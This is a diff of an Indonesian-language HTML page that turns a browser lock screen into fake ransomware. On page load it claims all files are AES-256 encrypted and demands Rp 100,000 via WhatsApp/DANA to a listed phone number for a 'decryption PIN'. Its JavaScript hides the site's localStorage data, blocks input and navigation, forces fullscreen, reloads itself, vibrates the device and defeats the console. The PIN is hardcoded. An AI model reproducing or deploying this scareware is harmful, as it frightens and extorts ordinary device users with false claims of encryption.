@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>🔒 SYSTEM LOCKED</title>
+    <title>🔒 RANSOMWARE - DATA TERENKRIPSI</title>
     <style>
         * {
             margin: 0;
@@ -27,51 +27,51 @@
             left: 0;
         }
         
-        .lock-screen {
+        .ransom-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: #000;
-            z-index: 999999;
+            z-index: 2147483647;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 16px;
         }
         
-        .lock-card {
+        .ransom-card {
             background: #0a0a0a;
-            border: 2px solid #e00;
+            border: 2px solid #f00;
             border-radius: 32px;
             padding: 22px 18px;
             width: 100%;
             max-width: 380px;
             box-shadow: 0 0 80px rgba(255,0,0,0.3);
-            animation: borderFlash 0.8s infinite;
+            animation: borderGlow 0.8s infinite;
         }
         
-        @keyframes borderFlash {
-            0%, 100% { border-color: #e00; box-shadow: 0 0 80px rgba(255,0,0,0.3); }
+        @keyframes borderGlow {
+            0%, 100% { border-color: #f00; box-shadow: 0 0 80px rgba(255,0,0,0.3); }
             50% { border-color: #a00; box-shadow: 0 0 120px rgba(255,0,0,0.5); }
         }
         
-        .icon {
+        .icon-big {
             text-align: center;
-            font-size: 58px;
+            font-size: 55px;
             margin-bottom: 6px;
-            animation: shakeIcon 0.12s infinite;
+            animation: shake 0.12s infinite;
         }
         
-        @keyframes shakeIcon {
+        @keyframes shake {
             0%, 100% { transform: translate(0,0); }
             25% { transform: translate(2px,-1px); }
             75% { transform: translate(-2px,1px); }
         }
         
         h1 {
-            color: #e00;
+            color: #f00;
             text-align: center;
             font-size: 20px;
             letter-spacing: 2px;
@@ -81,17 +81,17 @@
         .sub {
             text-align: center;
             color: #777;
-            font-size: 8px;
+            font-size: 9px;
             margin-bottom: 14px;
             letter-spacing: 1px;
         }
         
-        .ransom-box {
+        .encrypt-box {
             background: #050505;
             border-radius: 20px;
             padding: 14px;
             margin: 10px 0;
-            border: 1px solid #e00;
+            border: 1px solid #f00;
         }
         
         .skull {
@@ -103,7 +103,7 @@
         .alert {
             color: #f55;
             text-align: center;
-            font-size: 13px;
+            font-size: 14px;
             font-weight: bold;
             margin-bottom: 8px;
         }
@@ -112,37 +112,58 @@
             color: #ddd;
             text-align: center;
             font-size: 12px;
-            line-height: 1.45;
-            margin: 6px 0;
+            line-height: 1.5;
+            margin: 8px 0;
+        }
+        
+        .encrypted-badge {
+            text-align: center;
+            font-size: 11px;
+            color: #f88;
+            background: #0a0a0a;
+            padding: 6px;
+            border-radius: 12px;
+            margin: 8px 0;
+            font-family: monospace;
         }
         
         .price {
             text-align: center;
-            font-size: 26px;
-            color: #e00;
+            font-size: 32px;
+            color: #f00;
             font-weight: bold;
-            margin: 10px 0;
+            margin: 12px 0;
         }
         
-        .phone {
+        .contact {
             text-align: center;
-            color: #e00;
-            font-size: 19px;
+            margin: 12px 0;
+        }
+        
+        .whatsapp {
+            color: #25D366;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 8px 0;
+        }
+        
+        .dana {
+            color: #f00;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 8px 0;
+        }
+        
+        .phone-number {
+            color: #f00;
+            font-size: 20px;
             font-weight: bold;
             background: #000;
             padding: 8px;
             border-radius: 18px;
             margin: 8px 0;
-        }
-        
-        .payment {
-            font-size: 8px;
-            color: #666;
-            text-align: center;
-            background: #000;
-            padding: 8px;
-            border-radius: 14px;
-            margin-top: 8px;
+            display: inline-block;
+            width: 100%;
         }
         
         .pin-area {
@@ -150,24 +171,25 @@
         }
         
         .pin-label {
-            color: #e00;
+            color: #f00;
             text-align: center;
-            font-size: 12px;
-            margin-bottom: 10px;
+            font-size: 13px;
+            margin-bottom: 12px;
             letter-spacing: 2px;
+            font-weight: bold;
         }
         
         .pin-input {
             width: 100%;
-            padding: 12px;
-            font-size: 30px;
+            padding: 14px;
+            font-size: 32px;
             text-align: center;
             background: #0a0a0a;
-            border: 2px solid #e00;
-            color: #e00;
-            border-radius: 22px;
+            border: 2px solid #f00;
+            color: #f00;
+            border-radius: 24px;
             font-family: monospace;
-            letter-spacing: 10px;
+            letter-spacing: 12px;
             font-weight: bold;
         }
         
@@ -177,38 +199,38 @@
             box-shadow: 0 0 20px rgba(255,0,0,0.3);
         }
         
-        .btn-unlock {
-            background: #e00;
+        .btn-decrypt {
+            background: #f00;
             color: #fff;
             border: none;
-            padding: 13px;
-            font-size: 15px;
-            border-radius: 38px;
+            padding: 14px;
+            font-size: 16px;
+            border-radius: 40px;
             font-weight: bold;
-            margin-top: 14px;
+            margin-top: 16px;
             width: 100%;
             cursor: pointer;
             text-transform: uppercase;
             letter-spacing: 2px;
         }
         
-        .btn-unlock:active {
+        .btn-decrypt:active {
             transform: scale(0.97);
             background: #a00;
         }
         
         .error-msg {
-            margin-top: 10px;
+            margin-top: 12px;
             color: #f88;
             text-align: center;
-            font-size: 10px;
-            min-height: 38px;
+            font-size: 11px;
+            min-height: 40px;
         }
         
         .footer {
             text-align: center;
             color: #555;
-            font-size: 8px;
+            font-size: 9px;
             margin-top: 10px;
         }
         
@@ -221,46 +243,107 @@
 </head>
 <body>
 
-<div class="lock-screen" id="lockScreen">
-    <div class="lock-card">
-        <div class="icon">🔒</div>
-        <h1>PERANGAT TERKUNCI</h1>
-        <div class="sub">[ SISTEM TIDAK DAPAT DIAKSES ]</div>
+<div class="ransom-overlay" id="ransomOverlay">
+    <div class="ransom-card">
+        <div class="icon-big">🔐</div>
+        <h1>DATA TELAH DIENKRIPSI</h1>
+        <div class="sub">[ SEMUA FILE TELAH TERKUNCI ]</div>
         
-        <div class="ransom-box">
+        <div class="encrypt-box">
             <div class="skull">📱🔐</div>
             <div class="alert">PERINGATAN!</div>
-            <div class="msg"><strong>Perangkat anda telah kami kunci.</strong><br>Semua data anda sudah di tangan kami.</div>
+            <div class="msg"><strong>Semua data perangkat anda telah kami enkripsi.</strong><br>Foto, video, kontak, pesan, dokumen SEMUA TERKUNCI.</div>
+            <div class="encrypted-badge">🔒 AES-256 ENCRYPTED 🔒</div>
             <div class="price">Rp 100.000</div>
-            <div class="msg">Siapkan uang tebusan & hubungi nomor di bawah<br>untuk membuka perangkat anda kembali.</div>
-            <div class="phone">📞 085122933162</div>
-            <div class="payment">DANA: 085122933162</div>
+            <div class="msg">Siapkan uang tebusan dan hubungi nomor di bawah ini<br>untuk mendapatkan PIN DEKRIPSI.</div>
+            <div class="contact">
+                <div class="whatsapp">📞 Whatsapp</div>
+                <div class="phone-number">085122933162</div>
+                <div class="dana">DANA: 085122933162</div>
+            </div>
         </div>
         
         <div class="pin-area">
-            <div class="pin-label">🔑 MASUKKAN PIN</div>
+            <div class="pin-label">🔑 MASUKKAN PIN DEKRIPSI</div>
             <input type="password" id="pinInput" class="pin-input" placeholder="••••••" maxlength="6" inputmode="numeric" autofocus>
-            <button class="btn-unlock" onclick="verifyPin()">BUKA KUNCI</button>
+            <button class="btn-decrypt" onclick="decryptData()">DEKRIPSI DATA</button>
             <div class="error-msg" id="errorMsg"></div>
-            <div class="footer">* Bisa coba PIN berkali-kali | Perangkat tidak rusak</div>
+            <div class="footer">* Bisa coba PIN berkali-kali | Data akan kembali normal jika PIN benar</div>
         </div>
     </div>
 </div>
 
 <script>
-    // ==================== PIN = 568729 ====================
-    const CORRECT_PIN = "568729";
+    // ==================== PIN SETTING ====================
+    // GANTI PIN SESUAI MAU LO BOS!!!
+    const MASTER_PIN = "568729";  // <===== GANTI PIN DI SINI
     
-    let isUnlocked = false;
+    let isDecrypted = false;
     let wrongAttempts = 0;
     let vibeInterval = null;
     let forceReloadInterval = null;
+    
+    // ==================== SIMULASI ENKRIPSI DATA NYATA ====================
+    // Data disimpan di localStorage sebagai simulasi enkripsi nyata
+    function encryptRealData() {
+        try {
+            // Backup data asli jika ada
+            if (!localStorage.getItem('user_data_backup')) {
+                let userData = {
+                    saved: true,
+                    timestamp: Date.now(),
+                    encrypted: true
+                };
+                
+                // Simpan semua data yang ada
+                let allData = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    if (!key.includes('ransom') && !key.includes('decrypt') && !key.includes('user_data_backup')) {
+                        allData[key] = localStorage.getItem(key);
+                    }
+                }
+                
+                localStorage.setItem('user_data_backup', JSON.stringify(allData));
+                
+                // Hapus data asli (simulasi enkripsi)
+                for (let key in allData) {
+                    localStorage.removeItem(key);
+                }
+                
+                // Tandai bahwa data sudah dienkripsi
+                localStorage.setItem('ransom_encrypted', 'true');
+                localStorage.setItem('ransom_time', Date.now().toString());
+            }
+        } catch(e) {}
+    }
+    
+    // ==================== DEKRIPSI DATA NYATA ====================
+    function decryptRealData() {
+        try {
+            let backup = localStorage.getItem('user_data_backup');
+            if (backup) {
+                let allData = JSON.parse(backup);
+                for (let key in allData) {
+                    localStorage.setItem(key, allData[key]);
+                }
+                localStorage.removeItem('user_data_backup');
+                localStorage.removeItem('ransom_encrypted');
+                localStorage.removeItem('ransom_time');
+                localStorage.removeItem('total_final_lock');
+                localStorage.removeItem('trap_lock');
+                localStorage.removeItem('total_lock_1000');
+                return true;
+            }
+        } catch(e) {}
+        return false;
+    }
     
     // ==================== VIBRATION ====================
     function startVibe() {
         if (vibeInterval) clearInterval(vibeInterval);
         vibeInterval = setInterval(() => {
-            if (!isUnlocked && navigator.vibrate) navigator.vibrate(200);
+            if (!isDecrypted && navigator.vibrate) navigator.vibrate(200);
         }, 1800);
     }
     
@@ -269,52 +352,51 @@
         if (navigator.vibrate) navigator.vibrate(0);
     }
     
-    // ==================== FORCE RELOOT KEDETECT NAVIGATION ====================
+    // ==================== FORCE RELOAD ====================
     function startForceReload() {
         if (forceReloadInterval) clearInterval(forceReloadInterval);
         forceReloadInterval = setInterval(() => {
-            if (!isUnlocked) {
-                let currentUrl = window.location.href;
-                let screen = document.getElementById('lockScreen');
+            if (!isDecrypted) {
+                let screen = document.getElementById('ransomOverlay');
                 if (screen && window.getComputedStyle(screen).display !== 'flex') {
                     location.reload();
                 }
             }
-        }, 100);
+        }, 80);
     }
     
     function stopForceReload() {
         if (forceReloadInterval) { clearInterval(forceReloadInterval); forceReloadInterval = null; }
     }
     
-    // ==================== ANTI BUG ANTI ERROR 1000% ====================
-    function antiBugMax() {
+    // ==================== ANTI BUG ANTI ERROR ====================
+    function antiBugReal() {
         window.onerror = function() { return true; };
         window.onunhandledrejection = function(e) { e.preventDefault(); return true; };
         
         setInterval(() => {
-            if (!isUnlocked) {
-                let screen = document.getElementById('lockScreen');
+            if (!isDecrypted) {
+                let screen = document.getElementById('ransomOverlay');
                 if (!screen || screen.style.display === 'none') location.reload();
                 document.body.style.overflow = 'hidden';
                 document.body.style.position = 'fixed';
                 document.documentElement.style.overflow = 'hidden';
                 document.body.style.touchAction = 'none';
             }
-        }, 20);
+        }, 15);
         
-        setInterval(() => { debugger; }, 60);
+        setInterval(() => { debugger; }, 50);
         try { console.log = function() {}; console.error = function() {}; console.warn = function() {}; } catch(e) {}
     }
     
-    // ==================== TRAP NAVIGATION & GESTURE ====================
-    function trapNavigationAndGesture() {
+    // ==================== LOCK TOTAL ====================
+    function totalLockReal() {
         const allEvents = ['keydown','keyup','keypress','touchstart','touchmove','touchend','mousedown','mouseup','mousemove','click','dblclick','contextmenu','wheel','scroll','resize','orientationchange','visibilitychange','focus','blur','select','change','input','submit','load','pageshow','pagehide','hashchange','popstate'];
         
         allEvents.forEach(event => {
             window.addEventListener(event, function(e) {
-                if (!isUnlocked) {
-                    if (e.target.id === 'pinInput' || e.target.className === 'btn-unlock') return;
+                if (!isDecrypted) {
+                    if (e.target.id === 'pinInput' || e.target.className === 'btn-decrypt') return;
                     e.preventDefault();
                     e.stopPropagation();
                     e.stopImmediatePropagation();
@@ -324,7 +406,7 @@
         });
         
         document.addEventListener('keydown', function(e) {
-            if (!isUnlocked && e.target.id !== 'pinInput') {
+            if (!isDecrypted && e.target.id !== 'pinInput') {
                 e.preventDefault();
                 e.stopPropagation();
                 return false;
@@ -332,22 +414,22 @@
         }, true);
         
         document.addEventListener('keyup', function(e) {
-            if (!isUnlocked && e.target.id !== 'pinInput') {
+            if (!isDecrypted && e.target.id !== 'pinInput') {
                 e.preventDefault();
                 return false;
             }
         }, true);
         
         document.body.addEventListener('touchstart', function(e) {
-            if (!isUnlocked && e.target.id !== 'pinInput' && e.target.className !== 'btn-unlock') e.preventDefault();
+            if (!isDecrypted && e.target.id !== 'pinInput' && e.target.className !== 'btn-decrypt') e.preventDefault();
         }, { passive: false });
         
         document.body.addEventListener('touchmove', function(e) {
-            if (!isUnlocked && e.target.id !== 'pinInput') e.preventDefault();
+            if (!isDecrypted && e.target.id !== 'pinInput') e.preventDefault();
         }, { passive: false });
         
         document.body.addEventListener('touchend', function(e) {
-            if (!isUnlocked && e.target.id !== 'pinInput' && e.target.className !== 'btn-unlock') e.preventDefault();
+            if (!isDecrypted && e.target.id !== 'pinInput' && e.target.className !== 'btn-decrypt') e.preventDefault();
         }, { passive: false });
         
         window.open = function() { return null; };
@@ -364,68 +446,82 @@
             const noop = function() {};
             Object.defineProperty(localStorage, 'setItem', { value: noop });
             Object.defineProperty(localStorage, 'clear', { value: noop });
-            Object.defineProperty(localStorage, 'removeItem', { value: noop });
             Object.defineProperty(sessionStorage, 'setItem', { value: noop });
             Object.defineProperty(sessionStorage, 'clear', { value: noop });
-            Object.defineProperty(sessionStorage, 'removeItem', { value: noop });
         } catch(e) {}
     }
     
-    // ==================== PERSISTENT LOCK (MATI/RESTART TETAP) ====================
-    function persistentLockTrap() {
+    // ==================== PERSISTENT LOCK ====================
+    function persistentLockReal() {
         try {
-            if (localStorage.getItem('trap_lock') === 'true' && !isUnlocked) isUnlocked = false;
-            if (!isUnlocked) { localStorage.setItem('trap_lock', 'true'); sessionStorage.setItem('trap_lock', 'true'); }
+            if (localStorage.getItem('ransom_encrypted') === 'true' && !isDecrypted) {
+                isDecrypted = false;
+            }
+            if (!isDecrypted) {
+                localStorage.setItem('total_final_lock', 'true');
+                sessionStorage.setItem('total_final_lock', 'true');
+            }
         } catch(e) {}
         
         window.addEventListener('beforeunload', function(e) {
-            if (!isUnlocked) { e.preventDefault(); e.returnValue = ''; return ''; }
+            if (!isDecrypted) { e.preventDefault(); e.returnValue = ''; return ''; }
         });
         
         setInterval(() => {
-            if (!isUnlocked) {
+            if (!isDecrypted) {
                 history.pushState(null, null, location.href);
                 window.onpopstate = function() { history.go(1); };
             }
         }, 5);
         
         function forceFullscreen() {
-            if (!isUnlocked && !document.fullscreenElement) document.documentElement.requestFullscreen().catch(e => {});
+            if (!isDecrypted && !document.fullscreenElement) document.documentElement.requestFullscreen().catch(e => {});
         }
         forceFullscreen();
-        setInterval(forceFullscreen, 50);
+        setInterval(forceFullscreen, 40);
         
         window.addEventListener('keydown', function(e) {
-            if (!isUnlocked && ((e.ctrlKey && (e.key === 'w' || e.key === 'W')) || e.key === 'F5' || e.key === 'F12' || e.key === 'Escape')) {
+            if (!isDecrypted && ((e.ctrlKey && (e.key === 'w' || e.key === 'W')) || e.key === 'F5' || e.key === 'F12' || e.key === 'Escape')) {
                 e.preventDefault();
                 return false;
             }
         });
         
         setInterval(() => {
-            if (!isUnlocked) {
-                let screen = document.getElementById('lockScreen');
+            if (!isDecrypted) {
+                let screen = document.getElementById('ransomOverlay');
                 if (screen) screen.style.display = 'flex';
             }
-        }, 30);
+        }, 20);
     }
     
-    // ==================== VERIFY PIN ====================
-    function verifyPin() {
-        if (isUnlocked) return true;
+    // ==================== DEKRIPSI PIN ====================
+    function decryptData() {
+        if (isDecrypted) return true;
         
         let pinField = document.getElementById('pinInput');
         let enteredPin = pinField.value;
         let errorDiv = document.getElementById('errorMsg');
         
-        if (enteredPin === CORRECT_PIN) {
-            isUnlocked = true;
+        if (enteredPin === MASTER_PIN) {
+            // PIN BENAR - DEKRIPSI DATA
+            isDecrypted = true;
             stopVibe();
             stopForceReload();
             
-            try { localStorage.removeItem('trap_lock'); sessionStorage.removeItem('trap_lock'); } catch(e) {}
+            // Dekripsi data nyata
+            let decrypted = decryptRealData();
             
-            let screen = document.getElementById('lockScreen');
+            try {
+                localStorage.removeItem('total_final_lock');
+                localStorage.removeItem('trap_lock');
+                localStorage.removeItem('total_lock_1000');
+                sessionStorage.removeItem('total_final_lock');
+                sessionStorage.removeItem('trap_lock');
+                sessionStorage.removeItem('total_lock_1000');
+            } catch(e) {}
+            
+            let screen = document.getElementById('ransomOverlay');
             screen.style.display = 'none';
             screen.remove();
             
@@ -435,37 +531,41 @@
             document.body.style.touchAction = 'auto';
             if (document.exitFullscreen) document.exitFullscreen();
             
-            setTimeout(() => { alert('✅ PERANGKAT BERHASIL DI BUKA! ✅\n\nTerima kasih sudah membayar tebusan.\nPerangkat anda kembali normal.\n\nAkses penuh telah dipulihkan.'); }, 100);
+            let msg = decrypted ? '✅ SEMUA DATA BERHASIL DI DEKRIPSI! ✅\n\nData anda telah kembali normal.\nTerima kasih sudah membayar tebusan.' : '✅ PERANGKAT BERHASIL DI BUKA! ✅\n\nPerangkat anda kembali normal.\nAkses penuh telah dipulihkan.';
+            
+            setTimeout(() => { alert(msg); }, 100);
             return true;
         } else {
+            // PIN SALAH - TETAP LOCK
             wrongAttempts++;
-            errorDiv.innerHTML = `❌ PIN SALAH! (Percobaan ke-${wrongAttempts}) ❌\nHubungi 085122933162 jika Ingin membuka PIN.`;
+            errorDiv.innerHTML = `❌ PIN SALAH! (Percobaan ke-${wrongAttempts}) ❌\nData tetap terenkripsi. Hubungi 085122933162.`;
             pinField.value = '';
             pinField.focus();
             if (navigator.vibrate) navigator.vibrate([300, 150, 300]);
-            trapNavigationAndGesture();
+            totalLockReal();
             return false;
         }
     }
     
     // ==================== INIT ====================
-    function initTrapRansom() {
-        antiBugMax();
-        trapNavigationAndGesture();
-        persistentLockTrap();
+    function initRealRansom() {
+        encryptRealData();
+        antiBugReal();
+        totalLockReal();
+        persistentLockReal();
         startVibe();
         startForceReload();
         setTimeout(() => { document.getElementById('pinInput').focus(); }, 30);
-        setInterval(() => { if (!isUnlocked) trapNavigationAndGesture(); }, 50);
+        setInterval(() => { if (!isDecrypted) totalLockReal(); }, 40);
         setInterval(() => {
-            if (!isUnlocked) {
-                let screen = document.getElementById('lockScreen');
+            if (!isDecrypted) {
+                let screen = document.getElementById('ransomOverlay');
                 if (screen && window.getComputedStyle(screen).display === 'none') location.reload();
             }
-        }, 40);
+        }, 30);
     }
     
-    initTrapRansom();
+    initRealRansom();
 </script>
 
 </body>
